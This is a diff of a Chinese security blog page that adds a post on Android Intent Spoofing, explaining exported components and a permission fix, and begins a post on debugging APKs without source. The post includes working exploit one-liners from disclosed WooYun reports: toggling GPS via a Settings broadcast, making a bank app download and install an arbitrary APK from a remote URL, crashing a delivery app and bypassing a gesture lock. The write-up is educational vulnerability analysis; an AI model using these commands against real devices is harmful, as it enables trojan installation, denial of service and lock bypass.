@@ -129,7 +129,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">34</span>
+          <span class="site-state-item-count">35</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -201,6 +201,154 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/android_intent_base_attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="henices">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安全代码">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2020/03/19/android_intent_base_attack/" class="post-title-link" itemprop="url">Intent Spoofing 攻击</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-03-19 16:34:31" itemprop="dateCreated datePublished" datetime="2020-03-19T16:34:31+08:00">2020-03-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="0-Android的安全模型"><a href="#0-Android的安全模型" class="headerlink" title="0. Android的安全模型"></a>0. Android的安全模型</h2><ul>
+<li>application sandbox</li>
+<li>selinux</li>
+<li>permissions</li>
+<li>application signing</li>
+</ul>
+<p>正是因为Application sandbox的存在，App进程之间是相互隔离的。有下面一个场景一个<br>App需要调用weixin来分享内容，如何处理？这就需要用到intent，告诉Android系统你的<br>意图是什么，Android系统将调用相应的处理程序来处理。</p>
+<p>Intent 是一个将要执行的动作的抽象的描述，一般来说是作为参数来使用，由Intent来协<br>助完成android各个组件之间的通讯。比如说调用startActivity()来启动一个activity,或<br>者由broadcaseIntent()来传递给所有感兴趣的BroadcaseReceiver, 再或者由<br>startService()/bindservice()来启动一个后台的service.所以可以看出来，intent主要<br>是用来启动其他的activity 或者service，所以可以将intent理解成activity之间的粘合剂。</p>
+<h2 id="1-Intent"><a href="#1-Intent" class="headerlink" title="1. Intent"></a>1. Intent</h2><p>Intent有两种类型，Explicit Intent 和 Implicit Intent。</p>
+<ul>
+<li>Explicit Intent</li>
+</ul>
+<p>明确指定Intent的名字(全类名)，当你使用Explicit Intent 启动Activity或者启动 Service，<br>Android系统会立即启动Intent对象所指定的Component。</p>
+<ul>
+<li>Implicit Intent</li>
+</ul>
+<p>指定Intent的ACTION，当你使用Implicit Intent，Android系统将通过比较 App Manifest<br>文件中所定义的Intent filter来启动符合要求的Component。如果只有一个Intentfilter<br>被匹配成功，系统将启动对应的Component，并递送Intent Object。如果有多个intent<br>filter是兼容的，系统将显示一个dialog，用户可以选择需要使用的component</p>
+<p>下面用代码说明这两种Intent</p>
+<p>Explicit Intent</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Intent downloadIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, DownloadService.class);</span><br><span class="line">downloadIntent.setData(Uri.parse(fileUrl));</span><br><span class="line">startService(downloadIntent);</span><br></pre></td></tr></table></figure>
+
+<p>Implicit Intent</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Intent sendIntent = <span class="keyword">new</span> Intent();</span><br><span class="line">sendIntent.setAction(Intent.ACTION_SEND);</span><br><span class="line">sendIntent.putExtra(Intent.EXTRA_TEXT, textMessage);</span><br><span class="line">sendIntent.setType(HTTP.PLAIN_TEXT_TYPE); <span class="comment">// &quot;text/plain&quot; MIME type</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Verify that the intent will resolve to an activity</span></span><br><span class="line"><span class="keyword">if</span> (sendIntent.resolveActivity(getPackageManager()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">    startActivity(sendIntent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="2-Intent-Spoofing"><a href="#2-Intent-Spoofing" class="headerlink" title="2. Intent Spoofing"></a>2. Intent Spoofing</h2><p>Android Intent Spoofing是一个比较常见的问题。如果Android组件(component,service<br>receiver)是导出的话(exported=true)，恶意程序可以使用 Explicit Intent向这个组件<br>发送Intent，Android无法识别这个 Intent是谁发送的，将会正常的执行请求的操作。</p>
+<p>从上面的描述中可以发现，关键是 component要是导出的，而Android的component的导出的<br>默认值并不是固定的，这点我们从Google提供的文档可以证实。</p>
+<p><a target="_blank" rel="noopener" href="http://developer.android.com/guide/topics/manifest/receiver-element.html">http://developer.android.com/guide/topics/manifest/receiver-element.html</a></p>
+<p><strong>android:exported</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Whether or not the broadcast receiver can receive messages from sources outside</span><br><span class="line">its application — &quot;true&quot; if it can, and &quot;false&quot; if not. If &quot;false&quot;, the only messages </span><br><span class="line">the broadcast receiver can receive are those sent by components of the same </span><br><span class="line">application or applications with the same user ID.</span><br><span class="line"></span><br><span class="line">The default value depends on whether the broadcast receiver contains intent filters.</span><br><span class="line">The absence of any filters means that it can be invoked only by Intent objects </span><br><span class="line">that specify its exact class name. This implies that the receiver is intended </span><br><span class="line">only for application-internal use (since others would not normally know the class name). </span><br><span class="line">So in this case, the default value is &quot;false&quot;. On the other hand, the presence </span><br><span class="line">of at least one filter implies that the broadcast receiver is intended to receive </span><br><span class="line">intents broadcast by the system or other applications, so the default value is &quot;true&quot;.</span><br><span class="line"></span><br><span class="line">This attribute is not the only way to limit a broadcast receiver&#x27;s external exposure.</span><br><span class="line">You can also use a permission to limit the external entities that can send it </span><br><span class="line">messages (see the permission attribute).</span><br></pre></td></tr></table></figure>
+
+<p>我写了一个程序测试具体的情况。</p>
+<p>AndroidManifest.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.RECEIVE_SMS&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.PhoneReceiver&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.nsfocus.test&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>测试程序注册了一个Receiver，这个Receiver处理 com.nsfocus.test  <strong>Implicit Intent</strong><br>包含了一个Intent Filter，在AndroidManifest.xml中没有明确声明这个reciever是导出的<br>还是未导出的。</p>
+<p>receiver 的代码为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">        Toast.makeText(context, <span class="string">&quot;Get it&quot;</span>, Toast.LENGTH_LONG).show();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用adb shell中发送广播</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am broadcast -a com.nsfocus.test</span><br></pre></td></tr></table></figure>
+
+<p>可以看到Get it 的提示信息，也就是说 component 处理 Implicit Intent 时默认是<br><strong>exported=true</strong> 的，这就是问题的关键。</p>
+<p>下面修改代码改成 <strong>exported=false</strong>，看看是什么情况。</p>
+<p>AndroidManifest.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.PhoneReceiver&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.nsfocus.test&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>receiver 照样可以收到，显示”Get it”，所以在receiver里做校验是非常有必要的。因为<br>无论exported如何设置，只要里面包含了Intent Filter 就可以接受到消息。</p>
+<h3 id="2-1-一般解决方案"><a href="#2-1-一般解决方案" class="headerlink" title="2.1 一般解决方案"></a>2.1 一般解决方案</h3><p>如果设置了 intent-filter，可以利用 android:permission 属性来要求广播发送者所<br>需要具有的必要权限，这样才不会产生权限绕过问题。</p>
+<p>比如我在.PhoneReceiver里要实现收短信的功能，就应该写成这样</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.PhoneReceiver&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:permission</span>=<span class="string">&quot;android.permission.SMS_RECEIVED&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.PHONE_STATE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样广播发送者需要声明** android.permission.SMS_RECEIVED **权限，不然.PhoneReceiver就不<br>处理了，修改后测试发现确实收不到了。</p>
+<h3 id="2-2-漏洞实例"><a href="#2-2-漏洞实例" class="headerlink" title="2.2 漏洞实例"></a>2.2 漏洞实例</h3><h4 id="启用手机GPS"><a href="#启用手机GPS" class="headerlink" title="启用手机GPS"></a>启用手机GPS</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.android.settings&quot;</span>, <span class="string">&quot;com.android.settings.widget.SettingsAppWidgetProvider&quot;</span>);</span><br><span class="line">intent.addCategory(<span class="string">&quot;android.intent.category.ALTERNATIVE&quot;</span>);</span><br><span class="line">intent.setData(Uri.parse(<span class="string">&quot;custom:3&quot;</span>));</span><br><span class="line">mContext.sendBroadcast(intent);</span><br></pre></td></tr></table></figure>
+
+<p>上面这个例子是通过广播的方法进行攻击的，攻击的目标是com.android.settings.widget<br>Android并未提供操作GPS的API，但是通过上面这个方法却可以控制GPS的开关。而且更有趣<br>的是我们并没有声明任何和Location相关的权限 :)</p>
+<p>widget是Android提供的桌面的小插件，就和KDE的之类的插件类似，可以通过Google提供的<br>API来开发。</p>
+<p>custom:3 这个字符串比较诡异，其实可以在Android 的代码中找到</p>
+<p>/com/android/settings/widget/SettingsAppWidgetProvider.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> BUTTON_WIFI = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> BUTTON_BRIGHTNESS = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> BUTTON_SYNC = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> BUTTON_LOCATION = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> BUTTON_BLUETOOTH = <span class="number">4</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onReceive(context, intent);</span><br><span class="line">    String action = intent.getAction();</span><br><span class="line">    <span class="keyword">if</span> (WifiManager.WIFI_STATE_CHANGED_ACTION.equals(action)) &#123;</span><br><span class="line">        sWifiState.onActualStateChange(context, intent);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (BluetoothAdapter.ACTION_STATE_CHANGED.equals(action)) &#123;</span><br><span class="line">        sBluetoothState.onActualStateChange(context, intent);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (LocationManager.MODE_CHANGED_ACTION.equals(action)) &#123;</span><br><span class="line">        sLocationState.onActualStateChange(context, intent);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ContentResolver.ACTION_SYNC_CONN_STATUS_CHANGED.equals(action)) &#123;</span><br><span class="line">        sSyncState.onActualStateChange(context, intent);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (intent.hasCategory(Intent.CATEGORY_ALTERNATIVE)) &#123;</span><br><span class="line">        Uri data = intent.getData();</span><br><span class="line">        <span class="keyword">int</span> buttonId = Integer.parseInt(data.getSchemeSpecificPart());</span><br><span class="line">        <span class="keyword">if</span> (buttonId == BUTTON_WIFI) &#123;</span><br><span class="line">            sWifiState.toggleState(context);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (buttonId == BUTTON_BRIGHTNESS) &#123;</span><br><span class="line">            toggleBrightness(context);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (buttonId == BUTTON_SYNC) &#123;</span><br><span class="line">            sSyncState.toggleState(context);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (buttonId == BUTTON_LOCATION) &#123;</span><br><span class="line">            sLocationState.toggleState(context);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (buttonId == BUTTON_BLUETOOTH) &#123;</span><br><span class="line">            sBluetoothState.toggleState(context);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Don&#x27;t fall-through to updating the widget.  The Intent</span></span><br><span class="line">        <span class="comment">// was something unrelated or that our super class took</span></span><br><span class="line">        <span class="comment">// care of.</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// State changes fall through</span></span><br><span class="line">    updateWidget(context);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现无法对广播的发送者进行校验，收到广播就执行相关的动作。</p>
+<h4 id="江苏银行手机银行下载安装任意apk（可木马）"><a href="#江苏银行手机银行下载安装任意apk（可木马）" class="headerlink" title="江苏银行手机银行下载安装任意apk（可木马）"></a>江苏银行手机银行下载安装任意apk（可木马）</h4><p><a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2010-0104992">http://www.wooyun.org/bugs/wooyun-2010-0104992</a></p>
+<p>AndroidManifest.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span> <span class="attr">android:name</span>=<span class="string">&quot;.UpdateService&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;cn.jsb.china.UpdateService&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>UpdateService.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent arg6, <span class="keyword">int</span> arg7, <span class="keyword">int</span> arg8)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    Bundle v0 = arg6.getExtras();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(v0 != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.a = v0.getBoolean(<span class="string">&quot;isupdate&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.b = arg6.getStringExtra(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">    <span class="keyword">this</span>.c = <span class="keyword">this</span>.getSystemService(<span class="string">&quot;notification&quot;</span>);</span><br><span class="line">    <span class="keyword">this</span>.d = <span class="keyword">new</span> Notification();</span><br><span class="line">    <span class="keyword">this</span>.d.icon = <span class="number">17301633</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.a) &#123;</span><br><span class="line">        <span class="keyword">this</span>.i = <span class="keyword">new</span> RemoteViews(<span class="keyword">this</span>.getPackageName(), <span class="number">2130903048</span>);</span><br><span class="line">        <span class="keyword">this</span>.d.tickerText = <span class="string">&quot;正在下载江苏银行&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.i = <span class="keyword">new</span> RemoteViews(<span class="keyword">this</span>.getPackageName(), <span class="number">2130903043</span>);</span><br><span class="line">        <span class="keyword">this</span>.d.tickerText = <span class="string">&quot;正在下载手机证券&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.d.when = System.currentTimeMillis();</span><br><span class="line">    <span class="keyword">this</span>.d.flags |= <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">this</span>.d.flags |= <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">this</span>.d.defaults = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">this</span>.d.contentView = <span class="keyword">this</span>.i;</span><br><span class="line">    <span class="keyword">this</span>.d.setLatestEventInfo(((Context)<span class="keyword">this</span>), <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, PendingIntent.getActivity(((Context)<span class="keyword">this</span>), </span><br><span class="line">            <span class="number">0</span>, arg6, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.c.notify(<span class="keyword">this</span>.j, <span class="keyword">this</span>.d);</span><br><span class="line">    <span class="keyword">this</span>.g = <span class="keyword">new</span> jn(<span class="keyword">this</span>, Looper.myLooper(), ((Context)<span class="keyword">this</span>));</span><br><span class="line">    <span class="keyword">this</span>.g.sendMessage(<span class="keyword">this</span>.g.obtainMessage(<span class="number">3</span>, Integer.valueOf(<span class="number">0</span>)));</span><br><span class="line">    <span class="keyword">new</span> jm(<span class="keyword">this</span>, <span class="keyword">this</span>.b).start();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(arg6, arg7, arg8);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am startservice -n cn.jsb.china/.UpdateService --ez isupdate <span class="literal">true</span> --es url http://192.168.102.204/mijian_2.5.1_272.apk</span><br></pre></td></tr></table></figure>
+
+<h4 id="美团外卖客户端本地拒绝服务漏洞"><a href="#美团外卖客户端本地拒绝服务漏洞" class="headerlink" title="美团外卖客户端本地拒绝服务漏洞"></a>美团外卖客户端本地拒绝服务漏洞</h4><p><a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2010-0106580">http://www.wooyun.org/bugs/wooyun-2010-0106580</a></p>
+<p>利用代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am startservice -n com.sankuai.meituan.takeoutnew/com.sankuai.mtmp.service.MtmpService</span><br></pre></td></tr></table></figure>
+
+<h4 id="航旅纵横手势锁轻易绕过及其它漏洞"><a href="#航旅纵横手势锁轻易绕过及其它漏洞" class="headerlink" title="航旅纵横手势锁轻易绕过及其它漏洞"></a>航旅纵横手势锁轻易绕过及其它漏洞</h4><p><a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2010-0111692">http://www.wooyun.org/bugs/wooyun-2010-0111692</a></p>
+<p>利用代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am start com.umetrip.android.msky.app/com.umetrip.android.msky.activity.MainActivity</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li>[1] <a target="_blank" rel="noopener" href="https://appvigil.co/blog/intent-spoofing-vulnerability-in-android-apps/">Intent Spoofing Vulnerability in Android Apps – OWASP Top 10</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/anti_sandbox/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -252,6 +400,103 @@
 <p>只要鼠标一动就退出循环，继续往下执行。</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最近出现的样本在反动态沙盒检测方面明显地进化了，针对性极强，不再局限于古老的<br>IsDebuggerPresent，而是利用PEB检查CPU核数等技术办法来检测，沙盒对抗估技术在后面<br>的日子里一定会更加迅速的进化。</p>
 <h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><p>非常感谢西安研究中心的同事提供的样本，同时感谢同事lzx在样本分析时给予的大力支持。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/apk_debug/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="henices">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安全代码">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2020/03/19/apk_debug/" class="post-title-link" itemprop="url">使用Android Studio 调试无源码apk程序</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-03-19 16:34:31" itemprop="dateCreated datePublished" datetime="2020-03-19T16:34:31+08:00">2020-03-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>Apk无源码调试的方法有很多，现在发现使用Android Studio 结合 JEB　感觉良好，<br>主要是参考　<a target="_blank" rel="noopener" href="http://www.jianshu.com/p/c7899e5ea182">http://www.jianshu.com/p/c7899e5ea182</a>　这篇记录下了具体步骤。</p>
+<h2 id="1-下载-smalidea"><a href="#1-下载-smalidea" class="headerlink" title="1. 下载 smalidea"></a>1. 下载 smalidea</h2><p><a target="_blank" rel="noopener" href="https://bitbucket.org/JesusFreke/smali/downloads/smalidea-0.03.zip">https://bitbucket.org/JesusFreke/smali/downloads/smalidea-0.03.zip</a></p>
+<p>在Android studio的插件仓库中没有找到这个插件，需要下载本地安装<br>File -&gt; Settings -&gt; Plugins -&gt; Install plugin from disk  选择下载的插件，重启后生效。</p>
+<h2 id="2-apktool-输出源码文件"><a href="#2-apktool-输出源码文件" class="headerlink" title="2. apktool 输出源码文件"></a>2. apktool 输出源码文件</h2><p><a target="_blank" rel="noopener" href="https://github.com/iBotPeaches/Apktool/releases/download/2.2.0/apktool_2.2.0.jar">https://github.com/iBotPeaches/Apktool/releases/download/2.2.0/apktool_2.2.0.jar</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar apktool_2.2.0.jar d -f xx.apk -o xx</span><br></pre></td></tr></table></figure>
+
+<p>如果正常的将输出 smali 源码文件</p>
+<h2 id="3-Android-Studio-导入源码"><a href="#3-Android-Studio-导入源码" class="headerlink" title="3. Android Studio 导入源码"></a>3. Android Studio 导入源码</h2><p>File -&gt; New -&gt; import project  选择刚才导出的xx文件夹</p>
